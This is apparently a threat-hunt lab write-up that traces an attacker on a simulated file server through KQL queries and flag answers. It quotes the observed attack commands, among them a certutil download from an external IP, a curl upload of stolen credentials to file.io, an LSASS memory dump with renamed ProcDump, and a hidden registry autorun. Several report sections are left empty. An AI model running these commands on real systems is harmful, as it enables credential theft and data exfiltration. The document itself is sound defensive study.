## Table of Contents
1. Summary of Findings (SPOILERS)
2. Threat Hunt Investigation
3. Root Cause Analysis
4. Technical Timeline
5. Response and Recovery Analysis
	1. Immediate Response Actions
	2. Containment
	3. Eradication 
	4. Recovery
6. Post Incident 
7. Business Impact
8. Appendix A. Indicators of Compromise (IOCs)
9. Appendix B. MITRE ATT&CK Mapping

## Summary of Findings (SPOILERS)

Below is a dropdown with findings (flags) to this threat hunt. <br>
If you do not want to be spoiled, skip to the next section: [**Threat Hunt**]()

| **Flag** |                              **Objective**                              |                                        **Finding**                                         |       **Timestamp (UTC)**        |
| :------: | :---------------------------------------------------------------------: | :----------------------------------------------------------------------------------------: | :------------------------------: |
|    1     |         Identify the source IP address of the return connection         |                                      `159.26.106.98`                                       |  `2025-11-22T00:27:53.7487323Z`  |
|    2     |            Identify the compromised file server device name             |                                    `azuki-fileserver01`                                    |  `2025-11-22T00:38:57.1782864Z`  |
|    3     |             Identify the compromised administrator account              |                                        `fileadmin`                                         |  `2025-11-22T00:38:49.3470269Z`  |
|    4     |       Identify the command used to enumerate local network shares       |                                     `"net.exe" share`                                      |  `2025-11-22T00:40:54.8271951Z`  |
|    5     |          Identify the command used to enumerate remote shares           |                               `"net.exe" view \\10.1.0.188`                                |  `2025-11-22T00:42:01.9579347Z`  |
|    6     |         Identify the command used to enumerate user privileges          |                                    `"whoami.exe" /all`                                     |  `2025-11-22T00:42:24.1217046Z`  |
|    7     |      Identify the command used to enumerate network configuration       |                                   `"ipconfig.exe" /all`                                    |  `2025-11-22T00:42:46.3655894Z`  |
|    8     |         Identify the command used to hide the staging directory         |                          `"attrib.exe" +h +s C:\Windows\Logs\CBS`                          |  `2025-11-22T00:55:43.9986049Z`  |
|    9     |                Identify the data staging directory path                 |                                   `C:\Windows\Logs\CBS`                                    |  `2025-11-22T00:55:43.9986049Z`  |
|    10    |       Identify the command used to download the PowerShell script       | ``"certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1`` |  `2025-11-22T00:56:47.4100711Z`  |
|    11    |       What credential file was created in the staging directory?        |                                  `IT-Admin-Passwords.csv`                                  | ``2025-11-22T01:07:53.6746323Z`` |
|    12    |        What command was used to stage data from a network share?        |       `"xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y`        |  `2025-11-22T01:07:53.6746323Z`  |
|    13    |      What command was used to compress the staged collection data?      | `"tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .`  |  `2025-11-22T01:30:10.1421235Z`  |
|    14    |              What was the renamed credential dumping tool?              |                                          `pd.exe`                                          |  `2025-11-22T02:24:47.6967458Z`  |
|    15    | What command was used to dump process memory for credential extraction? |                `"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp`                |  `2025-11-22T02:24:47.6967458Z`  |
|    16    |          What command was used to exfiltrate the staged data?           |        `"curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io`        |  `2025-11-22T01:59:54.2755596Z`  |
|    17    |           What cloud service was used for data exfiltration?            |                                         `file.io`                                          |  `2025-11-22T01:59:54.2755596Z`  |
|    18    |       What registry value name was used to establish persistence?       |                                      `FileShareSync`                                       |  `2025-11-22T02:10:50.7952326Z`  |
|    19    |                What is the persistence beacon filename?                 |                                       `svchost.ps1`                                        |  `2025-11-22T02:10:50.7952326Z`  |
|    20    |                What PowerShell history file was deleted?                |                                 `ConsoleHost_history.txt`                                  |  `2025-11-22T02:26:01.1661095Z`  |
## Threat Hunt Investigation

## 🚩 **FLAG 1: INITIAL ACCESS - Return Connection Source**
After establishing initial access, sophisticated attackers often wait hours or days (dwell time) before continuing operations. They may rotate infrastructure between sessions to avoid detection.

Based on the previous investigation, credentials were stolen from user account `kenji.sato`
Additionally, the incident brief mentioned the attacker accessing the compromised system after 72 hours. So I searched for `DeviceLogonEvents` 72 hours after the initial compromise.

```KQL
DeviceLogonEvents
| where Timestamp > datetime(2025-11-22 00:00:00) 
| where DeviceName contains "azuki" 
| where AccountName == "kenji.sato"
| project Timestamp, DeviceName, AccountName, ActionType, LogonType, RemoteIP, RemotePort 
| sort by Timestamp asc
```
![[01 - Projects/CyberRange/05 - Community Threat Hunts/Cargo Hold/resources/Screenshot_8.png]]
The information given was confirmed as we can see an external IP address, `159.26.106.98`, was able to successfully remote into the compromised account at `2025-11-22T00:27:53.7487323Z`

Since this could indicate the start of the attack, I am using this timestamp to help filter future queries to after this timeframe. 

**Question:** Identify the source IP address of the return connection?
Flag: `159.26.106.98`
Timestamp: `2025-11-22T00:27:53.7487323Z`

## 🚩 **FLAG 2: LATERAL MOVEMENT - Compromised Device**
Lateral movement targets are selected based on their access to sensitive data or network privileges. File servers are high-value targets containing business-critical information.

As seen from the previous threat hunt, the attacker attempted to move laterally using `mstsc.exe`
```KQL
DeviceProcessEvents
| where DeviceName contains "azuki"
| where Timestamp > todatetime('2025-11-22T00:27:53.7487323Z')
| where ProcessCommandLine contains "mstsc.exe"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| sort by Timestamp asc
```
![[01 - Projects/CyberRange/05 - Community Threat Hunts/Cargo Hold/resources/Screenshot_9.png]]
Approximately 10 minutes after authenticating, the attacker tried to RDP to the internal host `10.1.0.188`

I'm not familiar with this internal host, so I had to do more digging:
```KQL 
DeviceLogonEvents
| where DeviceName contains "azuki"
| where Timestamp > todatetime('2025-11-22T00:38:47.8327343Z')
| project Timestamp, AccountName, DeviceName, ActionType, LogonType, RemoteIP, RemotePort
| sort by Timestamp asc
```
![[01 - Projects/CyberRange/05 - Community Threat Hunts/Cargo Hold/resources/Screenshot_10.png]]

Based on the timeframe, the attacker was able to remotely access `azuka-fileserver01` on user account `fileadmin`

**Question:** Identify the compromised file server device name?
Flag: `azuki-fileserver01`
Timestamp: `2025-11-22T00:38:57.1782864Z`
## 🚩 **FLAG 3: LATERAL MOVEMENT - Compromised Account**
Identifying which credentials were compromised determines the scope of unauthorized access and guides remediation efforts.

**Question:** Identify the compromised administrator account?
Flag: `fileadmin`
Timestamp: `2025-11-22T00:38:49.3470269Z`
## 🚩 **FLAG 4: DISCOVERY - Share Enumeration Command**
Network share enumeration reveals available data repositories and helps attackers identify targets for collection and exfiltration.

Now the attacker was able to compromise another system within the network, they'll most likely perform discovery activities to identify local and remote information about the system
```KQL
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where AccountName == "fileadmin"
| where Timestamp > todatetime('2025-11-22T00:27:53.7487323Z')
| project Timestamp, AccountName, DeviceName, FileName, ProcessCommandLine
| sort by Timestamp asc
```
![[01 - Projects/CyberRange/05 - Community Threat Hunts/Cargo Hold/resources/Screenshot_11.png]]

Which is confirmed as we see the the attacker snooping for the following information:
- Host and OS information (`whoami.exe`, `hostname.exe`, `systeminfo.exe`) 
- Account privileges and group enumeration (`net.exe user`, `net.exe localgroup`)
- Network configuration and discovery (`ipconfig.exe`, `arp.exe`)
-  Local and Remote share enumeration (`net.exe share`, `net.exe view \\10.1.0.188`)

**Question:** Identify the command used to enumerate local network shares?
Flag: `"net.exe" share`
Timestamp: `2025-11-22T00:40:54.8271951Z`

## 🚩 **FLAG 5: DISCOVERY - Remote Share Enumeration**
Attackers enumerate remote network shares to identify accessible file servers and data repositories across the network.

**Question:** Identify the command used to enumerate remote shares?
Flag: `"net.exe" view \\10.1.0.188`
Timestamp: `2025-11-22T00:42:01.9579347Z`

## 🚩 **FLAG 6: DISCOVERY - Privilege Enumeration**
Understanding current user privileges and group memberships helps attackers determine what actions they can perform and whether privilege escalation is needed.

**Question:** Identify the command used to enumerate user privileges?
Flag: `"whoami.exe" /all`
Timestamp: `2025-11-22T00:42:24.1217046Z`
## 🚩 **FLAG 7: DISCOVERY - Network Configuration Command**
Network configuration enumeration helps attackers understand the target environment, identify domain membership, and discover additional network segments.

**Question:** Identify the command used to enumerate network configuration?
Flag: `"ipconfig.exe" /all`
Timestamp: `2025-11-22T00:42:46.3655894Z`
## 🚩 **FLAG 8: DEFENSE EVASION - Directory Hiding Command**
Modifying file system attributes to hide directories prevents casual discovery by users and some security tools. Document the exact command line used.

Scrolling down a bit further, I discovered the attacker trying to hide a specific directory
```KQL
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where AccountName == "fileadmin"
| where Timestamp > todatetime('2025-11-22T00:27:53.7487323Z')
| project Timestamp, AccountName, DeviceName, FileName, ProcessCommandLine
| sort by Timestamp asc
```

![[01 - Projects/CyberRange/05 - Community Threat Hunts/Cargo Hold/resources/Screenshot_12.png]]
The attacker ran the command: ``"attrib.exe" +h +s C:\Windows\Logs\CBS``
- `attrib.exe` utility to modify file or directory attributes
- `+h` sets directory as hidden
- `+s` sets directory as a system folder
- `C:\Windows\Logs\CBS` target directory

`C:\Windows\Logs\CBS` is not a legitimate system directory. It's more than likely a staging directory for future use.

Their behavior matches the behavior from the compromise 72 hours prior:
Initial Access -> Discovery -> Defense Evasion 

**Question:** Identify the command used to hide the staging directory?
Flag: `"attrib.exe" +h +s C:\Windows\Logs\CBS`
Timestamp: `2025-11-22T00:55:43.9986049Z`
## **🚩 FLAG 9: COLLECTION - Staging Directory Path**
Attackers establish staging locations to organize tools and stolen data before exfiltration. This directory path is a critical IOC

**Question:** Identify the data staging directory path?
Flag: `C:\Windows\Logs\CBS`
Timestamp: `2025-11-22T00:55:43.9986049Z`
## **🚩** **FLAG 10: DEFENSE EVASION - Script Download Command**
Legitimate system utilities with network capabilities are frequently weaponized to download malware while evading detection.

Now that I know a potential staging directory, I want to know what process have targeted it.
```KQL
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where Timestamp > todatetime('2025-11-22T00:27:53.7487323Z')
| where ProcessCommandLine contains @"C:\Windows\Logs\CBS"
| project Timestamp, AccountName, DeviceName, InitiatingProcessFileName, ProcessCommandLine 
| sort by Timestamp asc
```
![[01 - Projects/CyberRange/05 - Community Threat Hunts/Cargo Hold/resources/Screenshot_13.png]]

The attacker was able to download a file using `certutil` as a [LOLbin]() to evade being detected.

They were able to download a PowerShell script, `ex.ps1`, from `78[.141[.]196[.]6` over ports `7331` and `8080`

**Question:** Identify the command used to download the PowerShell script?
Flag: `"certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1`
Timestamp: `2025-11-22T00:56:47.4100711Z`

## **🚩** **FLAG 11: COLLECTION - Credential File Discovery**
Credential files provide keys to the kingdom - enabling lateral movement and privilege escalation across the network.

From the previous query, I also see the attacker copying directories from `C:\FileShares` to the staging directory
```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where Timestamp > todatetime('2025-11-22T00:27:53.7487323Z')
| where ProcessCommandLine contains @"C:\Windows\Logs\CBS"
| project Timestamp, AccountName, DeviceName, InitiatingProcessFileName, ProcessCommandLine 
| sort by Timestamp asc
```
![[01 - Projects/CyberRange/05 - Community Threat Hunts/Cargo Hold/resources/Screenshot_14.png]]

The attacker was able to use `xcopy`, another [LOLbin](), to copy files over:
`xcopy.exe C:\FileShares\Contracts C:\Windows\Logs\CBS\contracts /E /I /H /Y`
`xcopy.exe C:\FileShares\Financial C:\Windows\Logs\CBS\financial /E /I /H /Y`
`xcopy.exe C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y`
`xcopy.exe C:\FileShares\Shipping C:\Windows\Logs\CBS\shipping /E /I /H /Y`
- `/E` copies all subdirectories (including empty directories)
- `/I` assumes source is directory 
- `/H` copies hidden and system files 
- `/Y` auto-approves overwriting file prompt
Reference: [xcopy](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/xcopy)

This staging directory now has every file from the file share's directories:
- `C:\FileShares\Contracts`
- `C:\FileShares\Financial`
- `C:\FileShares\IT-Admin`
- `C:\FileShares\Shipping`

However, this does not provide enough information about what files we copied, so I need to look deeper into`DeviceFileEvents`

```KQL
DeviceFileEvents
| where DeviceName == "azuki-fileserver01"
| where Timestamp > todatetime('2025-11-22T00:27:53.7487323Z')
| where FolderPath contains @"C:\Windows\Logs\CBS"
| project Timestamp, ActionType, FileName, FolderPath, InitiatingProcessCommandLine, SHA256
| sort by Timestamp asc
```
![[01 - Projects/CyberRange/05 - Community Threat Hunts/Cargo Hold/resources/Screenshot_16.png]]
Boom. <br>
Every file copied over.
- Contracts
- Purchase orders
- Employee contracts and performance reviews
- Invoices
- Quarter performances
- Tax documents
- Weekly and monthly file backups
- Email archives

And buried within the hundreds of sensitive business documents, we see the attacker stealing the spreadsheet `IT-Admin-Passwords.csv`
![[01 - Projects/CyberRange/05 - Community Threat Hunts/Cargo Hold/resources/Screenshot_15.png]]

**Question:** What credential file was created in the staging directory?
Flag: `IT-Admin-Passwords.csv`
SHA 256 Hash: `08555169a2fda7c5cd5e870a4ab7e2a6793592f6f2a91f7606b94e25ef5c3df3`
Timestamp: `2025-11-22T01:07:53.6746323Z`
### **🚩** **FLAG 12: COLLECTION - Recursive Copy Command**
Built-in system utilities are preferred for data staging as they're less likely to trigger security alerts. The exact command line reveals attacker methodology.

**Question:** What command was used to stage data from a network share?
Flag: `"xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y`
Timestamp: `2025-11-22T01:07:53.6746323Z`

## 🚩 **FLAG 13: COLLECTION - Compression Command**
Cross-platform compression tools indicate attacker sophistication. The full command line reveals the exact archiving methodology used.

Right after copying files to the staging directory, the attacker is seen compressing each directory and using `tar.exe` to archive 
```KQL
DeviceFileEvents
| where DeviceName == "azuki-fileserver01"
| where Timestamp > todatetime('2025-11-22T00:27:53.7487323Z')
| where FolderPath contains @"C:\Windows\Logs\CBS"
| project Timestamp, ActionType, FileName, FolderPath, InitiatingProcessCommandLine, SHA256
| sort by Timestamp asc
```
![[01 - Projects/CyberRange/05 - Community Threat Hunts/Cargo Hold/resources/Screenshot_17.png]]

Archiving the compressed .zip files provides the attacker: 
- Additionally compression, improving transfer over network
- Compatible with Linux archiving and compression
- Hides file contents from inspection

**Question:** What command was used to compress the staged collection data?
Flag: `"tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .`
Timestamp: `2025-11-22T01:30:10.1421235Z`

## 🚩 **FLAG 14: CREDENTIAL ACCESS - Renamed Tool**
Renaming credential dumping tools is a basic OPSEC practice to evade signature-based detection.

20 minutes after archiving, the attacker is seen running another executable `pd.exe` and deleting right after use.
![[01 - Projects/CyberRange/05 - Community Threat Hunts/Cargo Hold/resources/Screenshot_19.png]]
                                                            

Putting the SHA256 hash of this application does not return malicious results.
![[01 - Projects/CyberRange/05 - Community Threat Hunts/Cargo Hold/resources/Screenshot_20.png]]

So this isn't Mimikatz renamed as seen in the previous incident, but it for sure still dumps LSASS memory.

However, the name of this file rang a bell.
I recently used this application on my personal computer. 

pd.exe -> ProcDump
[ProcDump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump), a legitimate utility apart of the [Windows Sysinternal Suite](https://learn.microsoft.com/en-us/sysinternals/)

`"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp`
- `pd.exe` ProcDump renamed
- `-accepteula` agree to License Agreement 
- `-ma` creates full memory dump
- `876`  PID of LSASS 
- `C:\Windows\Logs\CBS\lsass.dmp` output file location

Running ProcDump on my own computer shows the EULA prompt on initial launch:
![[01 - Projects/CyberRange/05 - Community Threat Hunts/Cargo Hold/resources/Screenshot_18.png]]

**Question:** What was the renamed credential dumping tool?
Flag: `pd.exe`
Timestamp: `2025-11-22T02:24:47.6967458Z`
## 🚩 **FLAG 15: CREDENTIAL ACCESS - Memory Dump Command**
The complete process memory dump command line is critical evidence showing exactly how credentials were extracted.

**Question:** What command was used to dump process memory for credential extraction?
Flag: `"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp`
Timestamp: `2025-11-22T02:24:47.6967458Z`
## 🚩 **FLAG 16: EXFILTRATION - Upload Command**
Command-line HTTP clients enable scriptable data transfers. The complete command syntax is essential for building detection rules.

The staged directory was discovered with its contents, but I still need to confirm that data was exfiltrated from the system. As seen from previous behavior, the attacker was able to exfiltrate data to a third party cloud service. 
```KQL
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where Timestamp > todatetime('2025-11-22T00:27:53.7487323Z')
| where ProcessCommandLine contains "http" and ProcessCommandLine contains @"C:\Windows\Logs\CBS"
| project Timestamp, AccountName, FileName, ProcessCommandLine
| sort by Timestamp asc
```

Yes, the attacker utilized `curl.exe` to exfiltrate data to `https://file.io`
![[01 - Projects/CyberRange/05 - Community Threat Hunts/Cargo Hold/resources/Screenshot_23.png]]

But let's double check network activity to see if the connections were successful.
```KQL
DeviceNetworkEvents
| where DeviceName == "azuki-fileserver01"
| where Timestamp > todatetime('2025-11-22T00:27:53.7487323Z')
| where InitiatingProcessCommandLine contains "http" and InitiatingProcessCommandLine contains @"C:\Windows\Logs\CBS"
| project Timestamp, ActionType, InitiatingProcessAccountName, DeviceName, InitiatingProcessCommandLine, RemoteIP, RemotePort, RemoteUrl
| sort by Timestamp asc
```
![[01 - Projects/CyberRange/05 - Community Threat Hunts/Cargo Hold/resources/Screenshot_22.png]]

Unfortunately, the attacker was able to successfully exfiltrate:
- `credentials.tar.gz`
- `financial.tar.gz`
- `contracts.zip`
- `shippping.tar.gz`
- `lsass.dmp`

**Question:** What command was used to exfiltrate the staged data?
Flag: `"curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io`
Timestamp: `2025-11-22T01:59:54.2755596Z`
## 🚩 **FLAG 17: EXFILTRATION - Cloud Service**

Cloud file sharing services provide convenient, anonymous exfiltration channels that blend with legitimate business traffic.

**Question:** What cloud service was used for data exfiltration?
Flag: `file.io`
Timestamp: `2025-11-22T01:59:54.2755596Z`
## 🚩 **FLAG 18: PERSISTENCE - Registry Value Name**

Registry autorun keys provide reliable persistence that executes on every system startup or user logon.

Based on the attacker's behaviors from the previous incident, they were able to set up persistence mechanisms using local accounts and a scheduled task that runs daily. Unfortunately, searching for commands that contain `schtask` or `/add` does not return any results.

Another persistence mechanism attackers abuse are Windows Registry keys. So I looked if they modified any
```KQL
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where Timestamp > todatetime('2025-11-22T00:27:53.7487323Z')
| where ProcessCommandLine has_any ("HKEY_CURRENT_USER", "HKEY_LOCAL_MACHINE", "HKLM")
| project Timestamp, AccountName, InitiatingProcessFileName, ProcessCommandLine
| sort by Timestamp asc
```
![[01 - Projects/CyberRange/05 - Community Threat Hunts/Cargo Hold/resources/Screenshot_24.png]]

Just as I suspected. The attacker created a new autorun registry value

`"reg.exe" add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v FileShareSync /t REG_SZ /d "powershell -NoP -W Hidden -File C:\Windows\System32\svchost.ps1" /f`
- `reg.exe add` adds new registry value 
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` startup autorun key
- `/v FileShareSync` registry value name 
- `/t REG_SZ` registry type string
- `/d` registry value data
- `"powershell` executes PowerShell
- `-NoP` no profile
- `-W Hidden` hides PowerShell window
- `-File C:\Windows\System32\svchost.ps1` malicious PowerShell script
- `-f` force change

So whatever resides in the script `C:\Windows\System32\svchost.ps1` will execute automatically on startup

**Question:** What registry value name was used to establish persistence?
Flag: `FileShareSync`
Timestamp: `2025-11-22T02:10:50.7952326Z`
## 🚩 **FLAG 19: PERSISTENCE - Beacon Filename**

Process masquerading involves naming malicious files after legitimate Windows components to avoid suspicion

**Question:** What is the persistence beacon filename?
Flag: `svchost.ps1`
Timestamp: `2025-11-22T02:10:50.7952326Z`

## 🚩 **FLAG 20: ANTI-FORENSICS - History File Deletion**
PowerShell saves command history to persistent files that survive session termination. Attackers target these files to cover their tracks.

With their persistence mechanism set and active, the attacker is most likely going to delete any traces of their activity. I looked at `DeviceFileEvents` to see if any artifacts were deleted.

```KQL
DeviceFileEvents
| where DeviceName == "azuki-fileserver01"
| where Timestamp > todatetime('2025-11-22T00:27:53.7487323Z')
| where ActionType == "FileDeleted"
| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessCommandLine
| sort by Timestamp asc
```

![[01 - Projects/CyberRange/05 - Community Threat Hunts/Cargo Hold/resources/Screenshot_25.png]]

There are two files that were deleted:
- `ConsoleHost_history.txt` PowerShell history
- `pd.exe`  memory dumping executable (ProcDump?)

PowerShell saves command history in this text file. It is important for an attacker to remove this file to hide commands they ran during their attack. 

**Question:** What PowerShell history file was deleted?
Flag: `ConsoleHost_history.txt`
Timestamp: `2025-11-22T02:26:01.1661095Z`
## Root Cause Analysis


## Technical Timeline

## Response and Recovery

## Post Incident

## Business Impact

## Appendix A: Indicators of Compromise 

C:\Windows\Logs\CBS
Timestamp: `2025-11-22T00:55:43.9986049Z`

78.141.196.6:8080 and 78.141.196.6:7331
Timestamp: `2025-11-22T00:56:47.4100711Z`


C:\Windows\Logs\CBS\ex.ps1
Timestamp: `2025-11-22T00:56:47.4100711Z`


## Appendix B: MITRE ATT&CK  Mapping
